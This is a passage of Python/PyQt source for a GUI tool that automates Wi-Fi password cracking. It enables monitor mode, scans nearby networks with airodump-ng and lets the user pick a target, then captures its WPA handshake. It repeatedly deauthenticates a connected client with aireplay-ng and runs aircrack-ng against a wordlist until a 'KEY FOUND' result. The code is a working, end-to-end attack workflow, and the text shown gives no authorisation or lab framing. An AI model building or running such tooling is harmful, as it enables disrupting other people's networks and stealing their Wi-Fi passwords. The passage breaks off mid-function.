        main_layout.addWidget(param_group)
        table_group = QGroupBox("③ Networks — when the scan stops, click a row to pick your target")
        tbl = QVBoxLayout()
        self.table = QTableWidget()
        self.table.setColumnCount(9)
        self.table.setHorizontalHeaderLabels([
            "BSSID", "Channel", "ESSID", "Encryption",
            "Cipher", "Auth", "PWR", "Beacons", "Data"
        ])
        self.table.setSelectionBehavior(QTableWidget.SelectRows)
        self.table.setSelectionMode(QTableWidget.SingleSelection)
        self.table.itemClicked.connect(self.on_network_selected)
        self.table.setAlternatingRowColors(True)
        self.table.verticalHeader().setDefaultSectionSize(26)
        h = self.table.horizontalHeader()
        h.setSectionResizeMode(QHeaderView.Interactive)
        h.setStretchLastSection(True)
        tbl.addWidget(self.table)
        table_group.setLayout(tbl)
        main_layout.addWidget(table_group, stretch=1)
        log_group = QGroupBox("📜 Live Log")
        ll = QVBoxLayout()
        self.log_output = QTextEdit(); self.log_output.setReadOnly(True)
        self.log_output.setMinimumHeight(140)
        ll.addWidget(self.log_output); log_group.setLayout(ll)
        main_layout.addWidget(log_group, stretch=0)
        self.statusBar = QStatusBar()
        self.setStatusBar(self.statusBar)
        self.statusBar.showMessage(
            f"{APP_NAME} · {APP_TAGLINE} · press F1 for help")
        self.refresh_timer = QTimer()
        self.refresh_timer.timeout.connect(self.refresh_network_table)
        self.refresh_timer.setInterval(250)
        self.handshake_timer = QTimer()
        self.handshake_timer.timeout.connect(self.check_handshake)
        self.handshake_timer.setInterval(2000)
        self.scan_status = QLabel("")
    def _set_button_enabled(self, button, enabled):
        if button is not None: button.setEnabled(bool(enabled))

    def _append_log_from_worker(self, text): self._append_log(str(text))

    def _run_ui_callback(self, callback):
        try: callback()
        except Exception as e: self._append_log(f"[!] UI callback error: {e}")

    def _ui_call(self, callback):
        if QThread.currentThread() == self.thread(): callback()
        else: self.worker_ui_signal.emit(callback)

    def _worker_log(self, text):
        if QThread.currentThread() == self.thread(): self._append_log(str(text))
        else: self.worker_log_signal.emit(str(text))

    def log(self, text):
        if QThread.currentThread() != self.thread():
            self.worker_log_signal.emit(str(text)); return
        self._append_log(str(text))

    def _append_log(self, text):
        if not hasattr(self, "log_output"): return
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = TEXT
        s = str(text)
        if "[+]" in s: color = SUCCESS
        elif "[!]" in s: color = DANGER
        elif "[*]" in s: color = INFO
        elif "HANDSHAKE" in s: color = GOLD
        elif "📁" in s: color = GOLD
        elif "⚡" in s: color = GOLD_BRIGHT
        elif "KEY FOUND" in s.upper(): color = SUCCESS
        escaped = s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        self.log_output.append(
            f'<span style="color:{color};">[{timestamp}] {escaped}</span>')
        sb = self.log_output.verticalScrollBar(); sb.setValue(sb.maximum())

    def _set_automation_status(self, text, color):
        try:
            self.auto_status_label.setText(text)
            self.auto_status_label.setStyleSheet(
                f"color: {color}; font-family: 'Consolas'; font-weight: bold;")
        except Exception: pass

    def _set_automation_progress(self, text):
        try: self.auto_progress_label.setText(text)
        except Exception: pass

    def _set_automation_progress_signal(self, text):
        try: self.automation_progress_signal.emit(str(text))
        except Exception: pass

    def _open_csv_viewer(self, csv_path):
        try:
            dlg = CsvViewerDialog(csv_path, parent=self)
            dlg.setAttribute(Qt.WA_DeleteOnClose, True)
            dlg.destroyed.connect(self._cleanup_dialogs)
            self._dialogs.append(dlg); dlg.show()
            self.log(f"[*] Opened CSV viewer: {csv_path}")
        except Exception as e: self.log(f"[!] CSV viewer error: {e}")

    def _open_handshake_viewer(self, cap_path, csv_path, bssid):
        try:
            dlg = HandshakeResultDialog(cap_path=cap_path, csv_path=csv_path,
                                        bssid=bssid, parent=self)
            dlg.setAttribute(Qt.WA_DeleteOnClose, True)
            dlg.destroyed.connect(self._cleanup_dialogs)
            self._dialogs.append(dlg); dlg.show()
            self.log(f"[*] Opened handshake results: {cap_path}")
        except Exception as e: self.log(f"[!] Handshake viewer error: {e}")

    def _cleanup_dialogs(self):
        self._dialogs = [d for d in self._dialogs if d is not None]

    def view_scan_csv(self):
        if not self.csv_file or not Path(self.csv_file).exists():
            QMessageBox.warning(self, "No Scan CSV",
                "No scan CSV file exists yet.")
            return
        self._open_csv_viewer(self.csv_file)

    def view_handshake_csv(self):
        if not self.handshake_csv_file or not Path(self.handshake_csv_file).exists():
            QMessageBox.warning(self, "No Handshake CSV",
                "No handshake CSV file exists yet.")
            return
        self._open_csv_viewer(self.handshake_csv_file)

    def view_handshake_packets(self):
        if not self.handshake_cap_file or not Path(self.handshake_cap_file).exists():
            QMessageBox.warning(self, "No Handshake .cap",
                "No handshake .cap file exists yet.")
            return
        self._open_handshake_viewer(
            cap_path=self.handshake_cap_file,
            csv_path=self.handshake_csv_file,
            bssid=self.target_bssid.text().strip())

    def open_in_wireshark(self):
        if not self.handshake_cap_file or not Path(self.handshake_cap_file).exists():
            QMessageBox.warning(self, "No Handshake .cap",
                "No handshake .cap file exists yet.")
            return
        try:
            subprocess.Popen(["wireshark", str(self.handshake_cap_file)],
                             start_new_session=True)
            self.log(f"[+] Wireshark launched on {self.handshake_cap_file}")
        except FileNotFoundError:
            QMessageBox.warning(self, "Wireshark not found",
                "Install Wireshark: sudo apt install wireshark")
        except Exception as e:
            QMessageBox.warning(self, "Error", f"Launch failed:\n{e}")

    def browse_wordlist(self):
        try:
            path, _ = QFileDialog.getOpenFileName(
                self, "Select Wordlist",
                str(Path(DEFAULT_WORDLIST).parent),
                "Text files (*.txt *.lst *.dic);;All files (*)")
            if path:
                self.crack_wordlist.setText(path)
                self.log(f"[*] Wordlist selected: {path}")
        except Exception as e:
            self.log(f"[!] Browse wordlist error: {e}")

    def detect_interfaces(self):
        try:
            self.log("[*] Detecting wireless interfaces...")
            self.iface_combo.clear()
            interfaces = []
            r = subprocess.run(["iwconfig"], capture_output=True, text=True,
                               timeout=10, start_new_session=True)
            for line in r.stdout.splitlines():
                if "IEEE 802.11" in line:
                    parts = line.split()
                    if parts:
                        iface = parts[0].rstrip(":")
                        if iface not in interfaces: interfaces.append(iface)
            if interfaces:
                self.iface_combo.addItems(interfaces)
                self.log(f"[+] Found: {', '.join(interfaces)}")
                self.statusBar.showMessage(
                    f"Found {len(interfaces)} wireless interface(s)")
            else:
                self.log("[!] No wireless interfaces found.")
        except Exception as e:
            self.log(f"[!] Interface detection error: {e}")
    def _start_monitor_with_retries(self, iface, attempts=3):
        for attempt in range(1, attempts + 1):
            if self.is_closing: return None
            self._worker_log(
                f"[⚡ Auto] airmon-ng start {iface} (attempt {attempt}/{attempts})")
            out = ""
            try:
                r = subprocess.run(["sudo", "airmon-ng", "start", iface],
                                   capture_output=True, text=True, timeout=30,
                                   start_new_session=True)
                out = (r.stdout or "") + "\n" + (r.stderr or "")
                for line in out.splitlines():
                    if line.strip():
                        self._worker_log(f"[airmon] {line.rstrip()}")
            except Exception as e:
                self._worker_log(f"[!] airmon-ng start error: {e}")
            time.sleep(2)
            monitor = self._detect_monitor_interface(iface, out)
            if monitor: return monitor
            self._worker_log(
                f"[!] Attempt {attempt}: no monitor iface yet. Retrying…")
            time.sleep(1)
        return None

    def _is_monitor_interface(self, name):
        if not name: return False
        try:
            r = subprocess.run(["iw", "dev", name, "info"],
                               capture_output=True, text=True, timeout=5,
                               start_new_session=True)
            if r.returncode != 0: return False
            return "type monitor" in (r.stdout or "").lower()
        except Exception:
            return False

    def _detect_monitor_interface(self, original_iface, airmon_output=""):
        candidates = []
        if airmon_output:
            for line in airmon_output.splitlines():
                for word in re.split(r"[\s(),]+", line):
                    word = word.strip()
                    if word.endswith("mon") and len(word) > 3:
                        if word not in candidates: candidates.append(word)
        base = original_iface.rstrip("0123456789") or original_iface
        for name in [f"{original_iface}mon", f"{base}mon",
                     "mon0","mon1","mon2","mon3","mon4",
                     "mon5","mon6","mon7","mon8","mon9",
                     original_iface]:
            if name and name not in candidates: candidates.append(name)
        for name in candidates:
            if self._is_monitor_interface(name):
                self._worker_log(f"[+] Verified monitor interface: {name}")
                return name
        try:
            r = subprocess.run(["iw", "dev"], capture_output=True, text=True,
                               timeout=5, start_new_session=True)
            current = None
            for line in r.stdout.splitlines():
                s = line.strip()
                if s.startswith("Interface "): current = s.split()[-1]
                elif s.startswith("type ") and current:
                    if "monitor" in s.lower():
                        self._worker_log(
                            f"[+] Found monitor iface via iw dev: {current}")
                        return current
        except Exception as e:
            self._worker_log(f"[!] iw dev scan error: {e}")
        try:
            self._worker_log(f"[⚡ Auto] Trying manual monitor on {original_iface}")
            subprocess.run(["sudo", "ip", "link", "set", original_iface, "down"],
                           timeout=5, start_new_session=True)
            subprocess.run(["sudo", "iw", original_iface, "set", "monitor", "control"],
                           timeout=5, start_new_session=True)
            subprocess.run(["sudo", "ip", "link", "set", original_iface, "up"],
                           timeout=5, start_new_session=True)
            if self._is_monitor_interface(original_iface): return original_iface
        except Exception as e:
            self._worker_log(f"[!] Manual monitor failed: {e}")
        return None
    def run_step_3(self):
        if self.is_closing: return
        if self.realtime_scan.is_running():
            self.log("[!] Real-time scan already running."); return
        iface = self.monitor_interface or self.iface_combo.currentText().strip()
        if not iface:
            self.log("[!] No interface available."); return
        self.log("=" * 60)
        self.log(f"[*] Starting real-time scan on {iface}...")
        self.table.setRowCount(0); self.networks.clear()
        timestamp = int(time.time())
        scan_dir = Path("/tmp") / f"wifi_gui_{timestamp}"
        scan_dir.mkdir(parents=True, exist_ok=True)
        self.csv_prefix = str(scan_dir / "scan")
        self.csv_file = Path(self.csv_prefix + "-01.csv")
        self.log(f"📁 Output directory: {scan_dir}")
        self.log(f"📁 CSV file:         {self.csv_file}")
        self.log("=" * 60)
        self._ui_call(lambda: self.btn_view_scan_csv.setEnabled(True))
        self.capture_location_label.setText(f"📁 Location: {scan_dir}/")
        cmd = ["sudo", "airodump-ng", "--output-format", "csv",
               "--write", self.csv_prefix, iface]
        success = self.realtime_scan.start(cmd)
        if success: self.refresh_timer.start()

        def monitor_scan():
            while self.realtime_scan.is_running() and not self.is_closing:
                time.sleep(0.5)
            if not self.is_closing:
                self._ui_call(self.refresh_timer.stop)
                self.log("[*] Real-time scan stopped.")
                self._ui_call(self._on_realtime_scan_finished)
        threading.Thread(target=monitor_scan, daemon=True).start()
    def run_targeted_scan(self):
        if self.is_closing: return
        if self.targeted_scan.is_running():
            self.log("[!] Targeted scan already running."); return
        bssid = self.target_bssid.text().strip()
        channel = self.target_channel.text().strip()
        capture_name = self.capture_name.text().strip() or "gain"
        if not bssid or not channel:
            self.log("[!] Missing BSSID or channel."); return
        iface = self.monitor_interface or self.iface_combo.currentText().strip()
        if not iface:
            self.log("[!] No interface available."); return
        timestamp = int(time.time())
        self.handshake_dir = Path("/tmp") / f"handshake_{timestamp}"
        self.handshake_dir.mkdir(parents=True, exist_ok=True)
        self.handshake_prefix = str(self.handshake_dir / capture_name)
        self.handshake_cap_file = Path(self.handshake_prefix + "-01.cap")
        self.handshake_csv_file = Path(self.handshake_prefix + "-01.csv")
        self.capture_location_label.setText(f"📁 Location: {self.handshake_dir}/")
        self.handshake_status.setText("⏳ Capturing...")
        self.handshake_status.setStyleSheet(f"color:{WARNING};")
        self.log("=" * 60)
        self.log(f"[*] Starting targeted scan on {iface}...")
        self.log(f"[*] BSSID: {bssid}  ·  Channel: {channel}")
        self.log(f"📁 Output directory: {self.handshake_dir}")
        self.log("=" * 60)

        self._ui_call(lambda: self.btn_view_handshake_csv.setEnabled(True))
        self._ui_call(lambda: self.btn_view_handshake_packets.setEnabled(True))
        self._ui_call(lambda: self.btn_open_wireshark.setEnabled(True))

        cmd = ["sudo", "airodump-ng", "--bssid", bssid,
               "-c", channel, "-w", self.handshake_prefix, iface]
        success = self.targeted_scan.start(cmd, "[Handshake]")
        if success: self.handshake_timer.start()

        def monitor_target():
            while self.targeted_scan.is_running() and not self.is_closing:
                time.sleep(0.5)
            if not self.is_closing:
                self._ui_call(self.handshake_timer.stop)
                self._ui_call(lambda: self.handshake_status.setText("⏹ Capture stopped"))
                self.log("[+] Targeted scan stopped.")
        threading.Thread(target=monitor_target, daemon=True).start()
    def check_handshake(self):
        if not self.handshake_cap_file or not self.handshake_cap_file.exists(): return
        try:
            if self.handshake_cap_file.stat().st_size == 0: return
            bssid = self.target_bssid.text().strip()
            cmd = ["aircrack-ng"]
            if bssid: cmd += ["-b", bssid]
            cmd += [str(self.handshake_cap_file)]
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=10, start_new_session=True)
            combined = (r.stdout or "") + "\n" + (r.stderr or "")
            m = re.search(r"(\d+)\s+handshake", combined)
            if m and int(m.group(1)) >= 1:
                n = m.group(1)
                self.handshake_status.setText(f"✅ HANDSHAKE CAPTURED! ({n})")
                self.handshake_status.setStyleSheet(
                    f"color:{SUCCESS}; font-weight:bold;")
                self.log(f"[+] HANDSHAKE captured! ({n} handshake)")
                self.statusBar.showMessage(f"✅ HANDSHAKE CAPTURED! ({n})")
                self.handshake_timer.stop()
        except (subprocess.TimeoutExpired, FileNotFoundError):
            try:
                r = subprocess.run(
                    ["tshark", "-r", str(self.handshake_cap_file),
                     "-Y", "eapol", "-T", "fields", "-e", "eapol.type"],
                    capture_output=True, text=True, timeout=5,
                    start_new_session=True)
                if r.stdout.strip():
                    self.handshake_status.setText("✅ EAPOL frames detected")
                    self.handshake_status.setStyleSheet(
                        f"color:{SUCCESS}; font-weight:bold;")
                    self.handshake_timer.stop()
            except Exception: pass
        except Exception: pass
    def refresh_network_table(self):
        if self.is_closing: return
        if not self.csv_file or not self.csv_file.exists(): return
        try:
            networks = self.read_airodump_csv(self.csv_file)
            if not networks: return
            self.update_network_table(networks)
        except Exception: pass

    def read_airodump_csv(self, filename):
        networks = {}
        try:
            with open(filename, "r", encoding="utf-8",
                      errors="replace", newline="") as f:
                reader = csv.reader(f)
                in_ap = False
                for row in reader:
                    if not row: continue
                    first = row[0].strip()
                    if first == "BSSID": in_ap = True; continue
                    if first == "Station MAC": in_ap = False; continue
                    if not in_ap: continue
                    if len(row) < 14: continue
                    bssid = row[0].strip()
                    if not self.valid_mac(bssid): continue
                    networks[bssid] = {
                        "bssid": bssid, "channel": row[3].strip(),
                        "essid": row[13].strip() or "(hidden)",
                        "encryption": row[5].strip(), "cipher": row[6].strip(),
                        "auth": row[7].strip(), "pwr": row[8].strip(),
                        "beacons": row[9].strip(), "data": row[10].strip()}
        except (OSError, UnicodeDecodeError, csv.Error): return {}
        return networks

    @staticmethod
    def valid_mac(mac):
        parts = mac.split(":")
        if len(parts) != 6: return False
        for p in parts:
            if len(p) != 2: return False
            try: int(p, 16)
            except ValueError: return False
        return True

    def update_network_table(self, networks):
        if self.is_closing: return
        sel = None
        rows = self.table.selectionModel().selectedRows()
        if rows:
            item = self.table.item(rows[0].row(), 0)
            if item: sel = item.text()
        self.networks = networks
        self.table.setUpdatesEnabled(False)
        try:
            self.table.setRowCount(len(networks))
            for r, net in enumerate(sorted(networks.values(),
                                           key=lambda x: x["bssid"])):
                values = [net["bssid"], net["channel"], net["essid"],
                          net["encryption"], net["cipher"], net["auth"],
                          net["pwr"], net["beacons"], net["data"]]
                for c, v in enumerate(values):
                    self.table.setItem(r, c, QTableWidgetItem(str(v)))
            if sel:
                for r in range(self.table.rowCount()):
                    item = self.table.item(r, 0)
                    if item and item.text() == sel:
                        self.table.selectRow(r); break
        finally: self.table.setUpdatesEnabled(True)
        count = len(networks)
        self.statusBar.showMessage(f"Live scan: {count} network(s)")

    def on_network_selected(self, item):
        if self.is_closing: return
        row = item.row()
        b = self.table.item(row, 0); c = self.table.item(row, 1)
        e = self.table.item(row, 2); n = self.table.item(row, 3)
        if not b: return
        bssid = b.text()
        channel = c.text() if c else ""
        essid = e.text() if e else ""
        enc = n.text() if n else ""
        self.bssid_input.setText(bssid); self.channel_input.setText(channel)
        self.essid_input.setText(essid); self.encryption_input.setText(enc)
        self.target_bssid.setText(bssid); self.target_channel.setText(channel)
        self.deauth_bssid.setText(bssid)
        self.log(f"[*] Selected: {essid} ({bssid}) ch {channel}")
        self.statusBar.showMessage(f"Selected: {essid}")

        if self.automation_enabled and self.automation_phase == "waiting_selection":
            self.automation_pending_target = (bssid, channel, essid)
            self.log(f"[⚡ Auto] Target: {essid} ({bssid}) ch {channel}")
            self._set_automation_progress_signal(
                "Phase: target selected — starting capture…")
    def start_automation(self):
        if self.is_closing: return
        if self.automation_enabled:
            self.log("[!] Automation already running."); return
        iface = self.iface_combo.currentText().strip()
        if not iface and not self.monitor_interface:
            QMessageBox.warning(self, "No interface",
                "Select a wireless interface first.\n\n"
                "Tip: click 🔄 Detect, then pick your adapter.")
            return
        wl = self.crack_wordlist.text().strip()
        if not wl or not Path(wl).exists():
            QMessageBox.warning(self, "Wordlist missing",
                f"Wordlist not found:\n{wl or '(empty)'}\n\n"
                f"Default: {DEFAULT_WORDLIST}\n"
                "Click 📂 Browse to pick a valid wordlist.")
            return
        if self.monitor_interface and self._is_monitor_interface(self.monitor_interface):
            self.log(f"[⚡ Auto] Using existing monitor iface: {self.monitor_interface}")
            self._continue_start_automation(); return

        self.automation_enabled = True
        self.automation_phase = "preparing"
        self.btn_auto_start.setEnabled(False)
        self.btn_auto_stop.setEnabled(True)
        self._set_automation_status("🛠  Preparing monitor mode…", WARNING)
        self._set_automation_progress_signal("Phase: check kill + monitor mode")

        self.log("=" * 60)
        self.log("[⚡ Auto] Preparing monitor mode")
        self.log("=" * 60)

        def prep_worker():
            self._worker_log("[⚡ Auto] sudo airmon-ng check kill")
            try:
                r = subprocess.run(["sudo", "airmon-ng", "check", "kill"],
                                   capture_output=True, text=True, timeout=30,
                                   start_new_session=True)
                out = (r.stdout or "") + (r.stderr or "")
                for line in out.splitlines():
                    if line.strip(): self._worker_log(f"[check kill] {line.rstrip()}")
                self._worker_log(f"[⚡ Auto] check kill done (rc={r.returncode}).")
            except Exception as e:
                self._worker_log(f"[!] check kill error: {e}")
            monitor = self._start_monitor_with_retries(iface)
            if monitor:
                self.monitor_interface = monitor
                self._ui_call(lambda: self.status_label.setText("🟢 Monitor active"))
                self._ui_call(lambda: self.status_label.setStyleSheet(
                    f"color: {SUCCESS}; font-weight: bold;"))
                self._ui_call(lambda: self.deauth_iface.setText(monitor))
                self._ui_call(lambda: self.statusBar.showMessage(
                    f"Monitor interface: {monitor}"))
                self._worker_log(f"[+] Monitor ready: {monitor}")
                self._ui_call(self._continue_start_automation)
            else:
                self._worker_log("[!] [⚡ Auto] Could not start monitor. Aborting.")
                self._ui_call(self.stop_automation)
        threading.Thread(target=prep_worker, daemon=True).start()

    def _continue_start_automation(self):
        if self.is_closing: return
        if not self.monitor_interface or not self._is_monitor_interface(self.monitor_interface):
            iface = self.iface_combo.currentText().strip()
            found = self._detect_monitor_interface(iface) if iface else None
            if not found:
                self.log("[!] [⚡ Auto] Monitor iface unavailable. Aborting.")
                self.stop_automation(); return
            self.monitor_interface = found
            self.deauth_iface.setText(found)
            self.log(f"[⚡ Auto] Re-detected monitor iface: {found}")

        if self.realtime_scan.is_running():
            self.log("[!] [⚡ Auto] Scan already running."); return

        self.automation_enabled = True
        self.automation_phase = "scanning"
        self.automation_scan_start_ts = time.time()
        self.automation_scan_min_networks = self.auto_min_networks.value()
        self.automation_scan_max_seconds = self.auto_scan_timeout.value()
        self.automation_scan_grace_seconds = 3
        self.automation_deauth_count = self.auto_deauth_count.value()
        self.automation_deauth_rounds = self.auto_deauth_rounds.value()
        self.automation_deauth_round = 0
        self.automation_pending_target = None
        self._auto_scan_first_hit_ts = None
        self.crack_result = None

        self.btn_auto_start.setEnabled(False)
        self.btn_auto_stop.setEnabled(True)
        self._set_automation_status("🚀 Scanning for networks…", GOLD_BRIGHT)
        self._set_automation_progress_signal(
            f"Phase: real-time scan (max {self.automation_scan_max_seconds}s)")

        self.log("=" * 60)
        self.log("[⚡ Auto] Starting fully automated workflow")
        self.log(f"[⚡ Auto] Scan timeout         : {self.automation_scan_max_seconds}s")
        self.log(f"[⚡ Auto] Min networks to stop : {self.automation_scan_min_networks}")
        self.log(f"[⚡ Auto] Deauth count/round   : {self.automation_deauth_count}")
        self.log(f"[⚡ Auto] Deauth rounds        : {self.automation_deauth_rounds}")
        self.log(f"[⚡ Auto] Wordlist             : {self.crack_wordlist.text().strip()}")
        self.log("=" * 60)

        self.run_step_3()
        if not self.automation_poll_timer.isActive():
            self.automation_poll_timer.start()

    def stop_automation(self):
        if not self.automation_enabled and self.automation_phase == "idle": return
        self.log("[⚡ Auto] Stopping automation…")
        self.automation_enabled = False
        self.automation_phase = "idle"
        self.automation_pending_target = None
        try: self.automation_poll_timer.stop()
        except Exception: pass
        for r in (self.realtime_scan, self.targeted_scan,
                  self.deauth_attack, self.crack_attack):
            try: r.stop()
            except Exception: pass
        self.btn_auto_start.setEnabled(True)
        self.btn_auto_stop.setEnabled(False)
        self._set_automation_status("⚪ Idle — awaiting orders", TEXT)
        self._set_automation_progress_signal("Phase: —")
        self.log("[⚡ Auto] Automation stopped.")

    def _automation_tick(self):
        if self.is_closing or not self.automation_enabled: return
        try:
            if self.automation_phase == "preparing": return
            if self.automation_phase == "scanning":
                self._automation_phase_scanning()
            elif self.automation_phase == "waiting_selection":
                self._automation_phase_waiting_selection()
            elif self.automation_phase == "capture":
                self._automation_phase_capture()
        except Exception as e:
            self.log(f"[!] [⚡ Auto] tick error: {e}")

    def _automation_phase_scanning(self):
        elapsed = time.time() - self.automation_scan_start_ts
        n = len(self.networks)
        self._set_automation_progress_signal(
            f"Phase: scanning — {n} network(s), "
            f"{elapsed:.1f}s / {self.automation_scan_max_seconds}s")
        stop_reason = None
        if elapsed >= self.automation_scan_max_seconds:
            stop_reason = "timeout"
        elif n >= self.automation_scan_min_networks:
            if self._auto_scan_first_hit_ts is None:
                self._auto_scan_first_hit_ts = time.time()
            if time.time() - self._auto_scan_first_hit_ts >= self.automation_scan_grace_seconds:
                stop_reason = f"{n} networks found"
        if stop_reason:
            self.log(f"[⚡ Auto] Scan complete — {stop_reason}.")
            self._auto_scan_first_hit_ts = None
            try: self.realtime_scan.stop()
            except Exception: pass
            self.automation_phase = "waiting_selection"
            self._set_automation_status("🎯 Click a target row to proceed", GOLD)
            self._set_automation_progress_signal(
                "Phase: click a network row in the table to select the target…")
            self.log("[⚡ Auto] Scan stopped. Click a target row.")
            self.statusBar.showMessage(
                "🎯 Click a target row in the Networks table to continue")

    def _automation_phase_waiting_selection(self):
        if self.automation_pending_target is None: return
        bssid, channel, essid = self.automation_pending_target
        self.automation_pending_target = None
        if not bssid or not channel:
            self.log("[!] [⚡ Auto] Missing BSSID/channel. Aborting.")
            self.stop_automation(); return
        self.target_bssid.setText(bssid); self.target_channel.setText(channel)
        self.deauth_bssid.setText(bssid)
        if not self.capture_name.text().strip():
            self.capture_name.setText("gain")
        self.log(f"[⚡ Auto] Target locked: {essid} ({bssid}) ch {channel}")
        self.automation_phase = "capture"
        self.automation_capture_start_ts = time.time()
        self._set_automation_status("🎣 Capturing handshake…", WARNING)
        self._set_automation_progress_signal(
            "Phase: targeted capture — waiting for station MAC…")
        self.run_targeted_scan()

    def _automation_phase_capture(self):
        bssid = self.target_bssid.text().strip()
        if not bssid: return
        if not self.handshake_csv_file or not self.handshake_csv_file.exists():
            self._set_automation_progress_signal(
                "Phase: capture — waiting for CSV to appear…")
            return
        station = self._find_station_for_bssid(self.handshake_csv_file, bssid)
        if station:
            self.log(f"[⚡ Auto] Station MAC discovered: {station}")
            self.deauth_station.setText(station)
            self.automation_phase = "deauth"
            self.automation_deauth_round = 0
            self.automation_deauth_thread = threading.Thread(
                target=self._automation_deauth_worker,
                args=(bssid, station),
                name="automation-deauth", daemon=True)
            self.automation_deauth_thread.start()
        else:
            elapsed = time.time() - self.automation_capture_start_ts
            self._set_automation_progress_signal(
                f"Phase: capture — no station yet ({elapsed:.0f}s). Waiting…")

    def _find_station_for_bssid(self, csv_path, target_bssid):
        if not csv_path.exists(): return None
        try:
            with open(csv_path, "r", encoding="utf-8",
                      errors="replace", newline="") as f:
                reader = csv.reader(f)
                in_sta = False
                for row in reader:
                    if not row: continue
                    first = row[0].strip()
                    if first == "Station MAC": in_sta = True; continue
                    if first == "BSSID": in_sta = False; continue
                    if not in_sta: continue
                    if len(row) < 6: continue
                    sta = row[0].strip(); assoc = row[5].strip()
                    if not self.valid_mac(sta): continue
                    if assoc and assoc.upper() == target_bssid.upper():
                        return sta
        except Exception as e:
            self.log(f"[!] [⚡ Auto] CSV station parse error: {e}")
        return None

    def _automation_deauth_worker(self, bssid, station):
        iface = self.monitor_interface or self.iface_combo.currentText().strip()
        if not iface:
            self.log("[!] [⚡ Auto] No interface for deauth. Aborting.")
            self._ui_call(self.stop_automation); return

        total_rounds = self.automation_deauth_rounds
        count = self.automation_deauth_count
        self.log("=" * 60)
        self.log(f"[⚡ Auto] Deauth: {total_rounds} round(s) × count={count}")
        self.log(f"[⚡ Auto] BSSID   : {bssid}")
        self.log(f"[⚡ Auto] Station : {station}")
        self.log(f"[⚡ Auto] Interface: {iface}")
        self.log("=" * 60)

        for r in range(1, total_rounds + 1):
            if not self.automation_enabled or self.is_closing: break
            self.automation_deauth_round = r
            self._ui_call(lambda r=r: self._set_automation_status(
                f"🔨 Deauth round {r}/{total_rounds}", DANGER))
            self._set_automation_progress_signal(
                f"Phase: deauth round {r}/{total_rounds} (aireplay-ng -0 {count})")
            self.log(f"[⚡ Auto] Deauth round {r}/{total_rounds}…")

            cmd = ["sudo", "aireplay-ng", "-0", str(count),
                   "-a", bssid, "-c", station, iface]
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    stdin=subprocess.DEVNULL, text=True, encoding="utf-8",
                    errors="replace", bufsize=1, start_new_session=True,
                    env=os.environ.copy())
            except Exception as e:
                self.log(f"[!] [⚡ Auto] Deauth round {r} failed: {e}")
                break

            try:
                if proc.stdout is not None:
                    for line in iter(proc.stdout.readline, ""):
                        if not self.automation_enabled or self.is_closing: break
                        clean = line.rstrip("\r\n")
                        if clean: self.log(f"[Deauth] {clean}")
            except Exception: pass

            try: proc.wait(timeout=max(5, count * 2))
            except subprocess.TimeoutExpired:
                try: proc.terminate(); proc.wait(timeout=2)
                except Exception:
                    try: proc.kill()
                    except Exception: pass

            self.log(f"[⚡ Auto] Deauth round {r} done (rc={proc.poll()}).")
            if r < total_rounds:
                for _ in range(10):
                    if not self.automation_enabled or self.is_closing: break
                    time.sleep(0.2)

        self._ui_call(self._automation_start_crack)
    def _automation_start_crack(self):
        try: self.targeted_scan.stop()
        except Exception: pass
        try: self.handshake_timer.stop()
        except Exception: pass

        cap = self.handshake_cap_file
        wl = self.crack_wordlist.text().strip()
        if not cap or not Path(cap).exists():
            self.log("[!] [⚡ Auto] No .cap file — skipping crack.")
            self._automation_finish(); return
        if not wl or not Path(wl).exists():
            self.log(f"[!] [⚡ Auto] Wordlist missing: {wl}")
            self._automation_finish(); return

        bssid = self.target_bssid.text().strip()
        self.automation_phase = "cracking"
        self._set_automation_status("🔑 Cracking with aircrack-ng…", GOLD)
        self._set_automation_progress_signal(
            f"Phase: aircrack-ng with {Path(wl).name}…")

        self.log("=" * 60)
        self.log("[⚡ Auto] Starting aircrack-ng")
        self.log(f"📁 Capture : {cap}")
        self.log(f"📁 Wordlist: {wl}")
        self.log("=" * 60)

        cmd = ["aircrack-ng"]
        if bssid: cmd += ["-b", bssid]
        cmd += [str(cap), "-w", str(wl)]

        self.crack_attack = CommandRunner("aircrack-ng", self.log, log_to_panel=True)

        def monitor_crack():
            while self.crack_attack.is_running() and not self.is_closing:
                time.sleep(0.25)
            if self.is_closing: return
            output_text = "\n".join(self.crack_attack.output_lines)
            m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", output_text)
            if m:
                key = m.group(1)
                self.log(f"[+] [⚡ Auto] KEY FOUND: {key}")
                self._ui_call(lambda k=key: self._set_automation_status(
                    f"✅ KEY FOUND: {k}", SUCCESS))
                self.crack_result = f"SUCCESS — key: {key}"
            elif "Passphrase not in dictionary" in output_text:
                self.log("[!] [⚡ Auto] Passphrase not in wordlist.")
                self._ui_call(lambda: self._set_automation_status(
                    "❌ Passphrase not in wordlist", DANGER))
                self.crack_result = "FAILED — passphrase not in wordlist"
            elif "Packets contained no EAPOL data" in output_text:
                self.log("[!] [⚡ Auto] No EAPOL data — no handshake.")
                self._ui_call(lambda: self._set_automation_status(
                    "⚠ No handshake to crack", WARNING))
                self.crack_result = "FAILED — no handshake"
            elif "command not found" in output_text.lower():
                self.log("[!] [⚡ Auto] aircrack-ng not installed.")
                self.crack_result = "FAILED — aircrack-ng not installed"
            else:
                self.crack_result = "finished — no clear result"
                self.log("[*] [⚡ Auto] aircrack-ng finished without clear outcome.")
            self.log("=" * 60)
            self._ui_call(self._automation_finish)

        if not self.crack_attack.start(cmd, "[aircrack] "):
            self.log("[!] [⚡ Auto] Could not start aircrack-ng.")
            self._automation_finish(); return

        threading.Thread(target=monitor_crack,
                         name="auto-crack-monitor", daemon=True).start()

    def _automation_finish(self):
        for r in (self.targeted_scan, self.deauth_attack, self.crack_attack):
            try: r.stop()
            except Exception: pass

        self.automation_enabled = False
        self.automation_phase = "done"
        try: self.automation_poll_timer.stop()
        except Exception: pass

        self.btn_auto_start.setEnabled(True)
        self.btn_auto_stop.setEnabled(False)
        final_msg = self.crack_result or "complete"
        self._set_automation_status(f"✅ Complete — {final_msg}", SUCCESS)
        self._set_automation_progress_signal(f"Phase: done — {final_msg}")
        self.log(f"[⚡ Auto] Workflow finished. {final_msg}")
        self.statusBar.showMessage(f"Done — {final_msg}  |  Press F1 for help")

    def _on_realtime_scan_finished(self):
        if self.automation_enabled and self.automation_phase == "scanning":
